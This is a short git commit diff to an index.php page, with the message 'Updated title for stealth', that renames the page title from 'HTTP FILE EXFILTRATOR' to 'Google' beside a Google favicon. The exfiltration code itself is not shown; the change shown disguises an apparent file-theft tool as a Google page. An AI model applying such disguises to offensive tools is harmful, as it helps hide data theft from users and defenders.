3852605d83d7ccfcf845b892b2b911706fe16689
1lanphier <160071221+1lanphier@users.noreply.github.com>
2025-02-26 12:59:55 -0600

    Updated title for stealth

--- index.php
+++ index.php
@@ -51,7 +51,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>HTTP FILE EXFILTRATOR</title>
+    <title>Google</title>
     <link rel="icon" type="image/x-icon" href="https://www.google.com/favicon.ico">
     
     <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
